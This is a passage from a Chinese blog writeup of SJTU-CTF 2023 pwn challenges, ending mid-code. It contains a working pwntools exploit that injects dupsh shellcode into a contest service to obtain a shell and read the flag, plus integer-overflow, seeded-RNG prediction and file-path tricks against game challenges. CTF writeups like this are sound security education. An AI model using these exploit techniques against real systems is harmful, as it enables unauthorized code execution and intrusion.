

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
  <link rel="icon" href="/img/favicon.jpg">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="SJTU校赛的做出的题的writeup">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
  <title>SJTU-CTF-2023-Writeup - Zino&#39;s Blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"zino00.github.io","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"f45dcd001d67e8f9d84f91248ea31abf","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Zino's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/post.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="SJTU-CTF-2023-Writeup">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2023-03-14 23:00" pubdate>
        2023年3月14日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      14.5k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      206
       分钟
    </span>
  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">SJTU-CTF-2023-Writeup</h1>
            
            <div class="markdown-body">
              <h1 id="sjtu-ctf-2023-writeup"><a class="markdownIt-Anchor" href="#sjtu-ctf-2023-writeup"></a> SJTU-CTF 2023 Writeup</h1>
<h2 id="pwnable"><a class="markdownIt-Anchor" href="#pwnable"></a> Pwnable</h2>
<h3 id="fastupdater"><a class="markdownIt-Anchor" href="#fastupdater"></a> fastupdater</h3>
<p><img src="/posts/764dc2d/image-20230303133317665.png" srcset="/img/loading.gif" lazyload alt="image-20230303133317665"></p>
<p>看一下这道题的文件信息，发现保护都开满了，但是打开ida仔细阅读代码后我们发现，代码逻辑其实比较简单，main函数部分就是绑定一个2023端口后开始监听，等待客户端连接。</p>
<p><img src="/posts/764dc2d/image-20230303133527889.png" srcset="/img/loading.gif" lazyload alt="image-20230303133527889"></p>
<p>然后下面的函数主要逻辑就是要求客户端输入username和password，分别要和“admin&quot;以及&quot;correcthorsebatterystaple&quot;相等，然后就可以进入一个加载一个new program。</p>
<p><img src="/posts/764dc2d/image-20230303132647649.png" srcset="/img/loading.gif" lazyload alt="image-20230303132647649"></p>
<p>利用点就是<strong>mmap</strong>。</p>
<blockquote>
<p>mmap主要完成的功能就是内存映射，将一个文件或者对象映射到进程地址空间，该地址空间可以被多个程序共享</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">mmap</span> <span class="hljs-params">(<span class="hljs-keyword">void</span> *addr, <span class="hljs-keyword">size_t</span> length, <span class="hljs-keyword">int</span> prot, <span class="hljs-keyword">int</span> flags, <span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">off_t</span> offset)</span></span>;<br></code></pre></div></td></tr></table></figure>
<p>Arguments Describes (参数描述)</p>
<ul>
<li>参数addr指定文件应被映射到进程空间的起始地址，一般被指定一个空指针，此时选择起始地址的任务留给内核来完成。</li>
<li>len是映射到调用进程地址空间的字节数，它从被映射文件开头offset个字节开始算起。<br>
prot 参数指</li>
<li>定共享内存的访问权限。可取如下几个值的或：PROT_READ（可读） , PROT_WRITE （可写）, PROT_EXEC （可执行）, PROT_NONE（不可访问）。</li>
<li>flags由以下几个常值指定：MAP_SHARED , MAP_PRIVATE , MAP_FIXED，其中，MAP_SHARED , MAP_PRIVATE必选其一，而MAP_FIXED则不推荐使用。offset参数一般设为0，表示从文件头开始映射。<br>
参数fd为即将映射到进程空间的文件描述字，一般由open()返回，同时，fd可以指定为-1，此时须指定flags参数中的MAP_ANON，表明进行的是匿名映射（不涉及具体的文件名，避免了文件的创建及打开，很显然只能用于具有亲缘关系的进程间通信）。</li>
<li>offset参数一般设为0，表示从文件头开始映射, 代表偏移量。</li>
</ul>
<p>Return Value (返回值)</p>
<ul>
<li>函数的返回值为最后文件映射到进程空间的地址，进程可直接操作起始地址为该值的有效地址。</li>
</ul>
</blockquote>
<p>所有我们就可以在这个地方注入我们的shellcode代码</p>
<p>还有一个dupsh的问题</p>
<p>其实就是将socket创建出来的文件描述符dup了一下，然后后面用这个来进行通信，但是这个文件描述符其实不是012，所以我们直接用常规的shellcode的话其实只是在远程拿到一个shell,但是我们本机没有，所以其实要用dup2来将上面的那个我们进行通信的文件描述符指向0，1,2，也就是标准输入输出和标准错误，正好pwntools提供了这个函数，dupsh可以让我们指定一个文件描述符复制到012。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> socks<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socket<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br><br>socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, <span class="hljs-string">&quot;penguin.0ops.sjtu.cn&quot;</span>, <span class="hljs-number">18081</span>)<br>socket.socket = socks.socksocket<br><br>ip_port=(<span class="hljs-string">&quot;4e7e4b4bfc20486da794bbb6f94e53b8&quot;</span>,<span class="hljs-number">1</span>)<br><span class="hljs-comment"># ip_port2=(&#x27;127.0.0.1&#x27;,2023)</span><br><br>s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.connect(ip_port)<br><br>p = remote.fromsocket(s)<br>p.recvuntil(<span class="hljs-string">b&quot;Username:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;admin&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Password:&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&quot;correcthorsebatterystaple&quot;</span>)<br><br>shellcode = asm(shellcraft.dupsh(<span class="hljs-number">4</span>))<br>pad=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4026</span><br>payload=shellcode+pad<br><br><br>p.recvuntil(<span class="hljs-string">b&#x27;Upload new program now.&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Upload new program now.&quot;</span>)<br>p.sendline(payload)<br><br><span class="hljs-comment">#flag的路径</span><br>p.sendline(<span class="hljs-string">b&quot;cd /chal/.9b3e17e32373b6a81d024f9fbbf9c360&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;od -An -w1 -v -tx1 flag|awk \&#x27;&#123;for(i=1;i&lt;=NF;++i)&#123;printf \&quot;%s\&quot;,$i&#125;&#125;\&#x27;&quot;</span>)<br><br>    <br>p.interactive()<br>p.close()<br></code></pre></div></td></tr></table></figure>
<p>不过pwntools似乎不支持收发很多数据，最大只能收发0x1000 byte，这使得收集数据有点困难，只能将输出重定向到文件，然后手工一下删除不必要的东西。得到flag图片的16进制数据</p>
<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">python3 exp.py &gt; flag.txt<br></code></pre></div></td></tr></table></figure>
<p>转化一下，输出成图片</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii <br>txtname=<span class="hljs-string">&quot;flag.txt&quot;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(txtname, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    a=f.read()<br>    <br>a=a.strip()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.jpg&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    pic = binascii.a2b_hex(a)<br>    f.write(pic)<br></code></pre></div></td></tr></table></figure>
<p>太不容易了。中间过程有些许艰辛。</p>
<p><img src="/posts/764dc2d/image-20230303143836954.png" srcset="/img/loading.gif" lazyload alt="image-20230303143836954"></p>
<h3 id="简单的rpg1"><a class="markdownIt-Anchor" href="#简单的rpg1"></a> 简单的RPG1</h3>
<p><img src="/posts/764dc2d/image-20230225224643551.png" srcset="/img/loading.gif" lazyload alt="image-20230225224643551"></p>
<p>由代码可知，需要我们每次输入和choice和(status * 9) ^ 0x86)按位异或后，都和stage1key[status]相等。</p>
<p>stage1key在代码最上面定义</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">unsigned</span> char stage<span class="hljs-number">1</span>key[]=&#123;<span class="hljs-number">157</span>, <span class="hljs-number">212</span>, <span class="hljs-number">213</span>, <span class="hljs-number">134</span>, <span class="hljs-number">249</span>, <span class="hljs-number">234</span>, <span class="hljs-number">171</span>, <span class="hljs-number">226</span>, <span class="hljs-number">140</span>, <span class="hljs-number">204</span>, <span class="hljs-number">135</span>, <span class="hljs-number">167</span>, <span class="hljs-number">241</span>, <span class="hljs-number">168</span>, <span class="hljs-number">188</span>, <span class="hljs-number">26</span>, <span class="hljs-number">77</span>, <span class="hljs-number">92</span>, <span class="hljs-number">63</span>, <span class="hljs-number">118</span>, <span class="hljs-number">118</span>, <span class="hljs-number">32</span>, <span class="hljs-number">27</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60</span>, <span class="hljs-number">6</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>&#125;;<br></code></pre></div></td></tr></table></figure>
<p>因此我们可以逆向将每次需要输入的choice求出来。</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> stage1key[] = &#123;<span class="hljs-number">157</span>, <span class="hljs-number">212</span>, <span class="hljs-number">213</span>, <span class="hljs-number">134</span>, <span class="hljs-number">249</span>, <span class="hljs-number">234</span>, <span class="hljs-number">171</span>, <span class="hljs-number">226</span>, <span class="hljs-number">140</span>, <span class="hljs-number">204</span>, <span class="hljs-number">135</span>, <span class="hljs-number">167</span>, <span class="hljs-number">241</span>, <span class="hljs-number">168</span>, <span class="hljs-number">188</span>, <span class="hljs-number">26</span>, <span class="hljs-number">77</span>, <span class="hljs-number">92</span>, <span class="hljs-number">63</span>, <span class="hljs-number">118</span>, <span class="hljs-number">118</span>, <span class="hljs-number">32</span>, <span class="hljs-number">27</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60</span>, <span class="hljs-number">6</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> status = <span class="hljs-number">0</span>; status &lt; <span class="hljs-number">28</span>; status++)<br>    &#123;<br>        <span class="hljs-keyword">int</span> a = ((status * <span class="hljs-number">9</span>) ^ <span class="hljs-number">0x86</span>) ^ stage1key[status];<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, a);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>output</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">27</span> <span class="hljs-number">91</span> <span class="hljs-number">65</span> <span class="hljs-number">27</span> <span class="hljs-number">91</span> <span class="hljs-number">65</span> <span class="hljs-number">27</span> <span class="hljs-number">91</span> <span class="hljs-number">66</span> <span class="hljs-number">27</span> <span class="hljs-number">91</span> <span class="hljs-number">66</span> <span class="hljs-number">27</span> <span class="hljs-number">91</span> <span class="hljs-number">68</span> <span class="hljs-number">27</span> <span class="hljs-number">91</span> <span class="hljs-number">67</span> <span class="hljs-number">27</span> <span class="hljs-number">91</span> <span class="hljs-number">68</span> <span class="hljs-number">27</span> <span class="hljs-number">91</span> <span class="hljs-number">67</span> <span class="hljs-number">98</span> <span class="hljs-number">97</span> <span class="hljs-number">98</span> <span class="hljs-number">97</span><br></code></pre></div></td></tr></table></figure>
<p>[十进制到 Ascii 文本转换器 - bfotool](<a target="_blank" rel="noopener" href="https://bfotool.com/zh/decimal-to-ascii#:~:text=%E5%8D%81%E8%BF%9B%E5%88%B6%E5%88%B0">https://bfotool.com/zh/decimal-to-ascii#:~:text=十进制到</a> Ascii 转换器示例 输入 69,120 97 109 112 108 101)</p>
<p>转化为ascii</p>
<figure class="highlight mathematica"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mathematica"><span class="hljs-variable">esc</span> <span class="hljs-punctuation">[</span><span class="hljs-variable">A</span> <span class="hljs-variable">esc</span> <span class="hljs-punctuation">[</span><span class="hljs-variable">B</span> <span class="hljs-variable">esc</span> <span class="hljs-punctuation">[</span><span class="hljs-variable">B</span> <span class="hljs-variable">esc</span> <span class="hljs-punctuation">[</span><span class="hljs-built_in">D</span> <span class="hljs-variable">esc</span> <span class="hljs-punctuation">[</span><span class="hljs-built_in">C</span> <span class="hljs-variable">esc</span> <span class="hljs-punctuation">[</span><span class="hljs-built_in">D</span> <span class="hljs-variable">esc</span> <span class="hljs-punctuation">[</span><span class="hljs-variable">Cbaba</span><br></code></pre></div></td></tr></table></figure>
<p>其中esc即为键盘上的esc按键</p>
<h3 id="简单的rpg2"><a class="markdownIt-Anchor" href="#简单的rpg2"></a> 简单的RPG2</h3>
<p>这关的主要意思就是有10000块钱，必须要买1把圣剑，买完圣剑不到4000块钱，力量只有350，要求力量必须要到10000，不然打不过巨龙。</p>
<p>其他choice都没啥可以利用的地方，下面的choice可以自己输入一串字符，大概率是可以利用的。</p>
<p>看代码是输入一个num，那cost就可以溢出</p>
<p>但是想了半天感觉溢出到负数还是过不了判断。</p>
<p>后来计算机上随便按按突然想到num再大一点的话还可以再溢出一下，即num*50超过了int的32位，截断后cost重新变为正数。</p>
<p>所以考虑将cost溢出为4000元</p>
<p>看一下4000的十六进制是0xFA0</p>
<p>所以可以取一个溢出前的cost=0x100000FA0，这样一溢出就会变成0xFA0</p>
<p>这样的话num=cost÷50=0x100000FA0÷50=4,294,971,250÷50=85,899,425</p>
<p>所以在游戏界面里面买完圣剑后，再去买85,899,425个树枝即可</p>
<p><img src="/posts/764dc2d/image-20230225225844752.png" srcset="/img/loading.gif" lazyload alt="image-20230225225844752"></p>
<h3 id="简单的rpg3"><a class="markdownIt-Anchor" href="#简单的rpg3"></a> 简单的RPG3</h3>
<p><img src="/posts/764dc2d/image-20230313202528958.png" srcset="/img/loading.gif" lazyload alt="image-20230313202528958"></p>
<p><img src="/posts/764dc2d/image-20230313202604545.png" srcset="/img/loading.gif" lazyload alt="image-20230313202604545"></p>
<p>srand是设置rand函数的初始化种子，当初始化种子一样的时候，rand函数产生的随机数序列是不会发生变化的。</p>
<p>而这里是采用了(time(0)/10)，就是time(0)就是当前时间-1970的总秒数，这个意思就是每一个十秒内产生的随机数序列都是一样的。所以我们可以利用下面脚本根据一个当前时间提前将初始化种子设置为一个十秒的最开始，距离当前时间30s左右（30秒就是反应时间，够跑完脚本然后进入游戏即可），然后将seed的时间算出来，所以我们只要在这个时间开始的十秒内按下进入游戏的按键，我们就可以用提前算好输入序列通过游戏了。</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">char</span> tab[<span class="hljs-number">4</span>]=&#123;<span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_time</span><span class="hljs-params">(<span class="hljs-keyword">int</span> t)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> totalSeconds = t;<br>    <span class="hljs-keyword">int</span> currentSeconds = totalSeconds % <span class="hljs-number">60</span>;<br><br>    <span class="hljs-keyword">int</span> totalMinutes = totalSeconds / <span class="hljs-number">60</span>;<br>    <span class="hljs-keyword">int</span> currentMinutes = totalMinutes % <span class="hljs-number">60</span>;<br><br>    <span class="hljs-keyword">int</span> totalHours  = totalMinutes / <span class="hljs-number">60</span>;<br>    <span class="hljs-keyword">int</span> currentHours = totalHours % <span class="hljs-number">24</span>;<br>    cout &lt;&lt; <span class="hljs-string">&quot;----------------------&quot;</span> &lt;&lt; endl;<br>    cout &lt;&lt; currentHours &lt;&lt; <span class="hljs-string">&quot;:&quot;</span> &lt;&lt; currentMinutes &lt;&lt; <span class="hljs-string">&quot;:&quot;</span> &lt;&lt; currentSeconds&lt;&lt;endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;----------------------&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> a=<span class="hljs-built_in">time</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">int</span> seed=<span class="hljs-number">10</span>-a%<span class="hljs-number">10</span>+a+<span class="hljs-number">30</span>;<span class="hljs-comment">//将初始化种子设置为一个十秒的最开始，距离当前时间30s左右</span><br>    <span class="hljs-built_in">srand</span>(seed/<span class="hljs-number">10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;current time(s): %d\n&quot;</span>,a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;seed: %d\n&quot;</span>,seed);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;seed/10: %d\n&quot;</span>,seed/<span class="hljs-number">10</span>);<br>    <span class="hljs-comment">//打印出操作顺序</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c\n&quot;</span>,tab[<span class="hljs-built_in">rand</span>()%<span class="hljs-number">4</span>]);<br>    &#125;<br>    cout&lt;&lt;<span class="hljs-string">&quot;current time&quot;</span>&lt;&lt;endl;<br>    <span class="hljs-built_in">get_time</span>(a);<br>    cout&lt;&lt;<span class="hljs-string">&quot;target time&quot;</span>&lt;&lt;endl;<br>    <span class="hljs-built_in">get_time</span>(seed);<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p><img src="/posts/764dc2d/image-20230313203209021.png" srcset="/img/loading.gif" lazyload alt="image-20230313203209021"></p>
<h3 id="简单的rpg4"><a class="markdownIt-Anchor" href="#简单的rpg4"></a> 简单的RPG4</h3>
<p>这题没有源码了，但是可以从libstage4.so中看反汇编后的代码</p>
<p>主要代码逻辑就是题目以及率先打开了一张角色卡，战斗力3000点，要求我们也输入一个角色卡的路径，获取其战斗力，如果战斗力大于3000，那么我们就可以取胜。</p>
<p>题目关键代码如下，可以看到，输入限制了我们前十个字符为&quot;your_deck/&quot;，也就是说我们需要去读取这个目录下的角色卡</p>
<p><img src="/posts/764dc2d/image-20230226155148328.png" srcset="/img/loading.gif" lazyload alt="image-20230226155148328"></p>
<p>然后我把三张都输了一次，结果战斗力都只有0，果不其然输掉了。</p>
<p>于是打印了一下这两个文件里面所有角色卡的战斗力 ，发现大于3500的角色卡在opp_deck文件夹里面。</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> buf=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;./easyrpg/opp_deck/Blue-Eyes_White_Dragon.card&quot;</span>, <span class="hljs-number">0</span>);<br>    read(fd, &amp;buf, <span class="hljs-number">2uLL</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Blue-Eyes_White_Dragon:%d\n&quot;</span>,buf);<br><br>    fd = open(<span class="hljs-string">&quot;./easyrpg/opp_deck/Dragonmaid_Strahl.card&quot;</span>, <span class="hljs-number">0</span>);<br>    read(fd, &amp;buf, <span class="hljs-number">2uLL</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dragonmaid_Strahl:%d\n&quot;</span>,buf);<br><br>    fd = open(<span 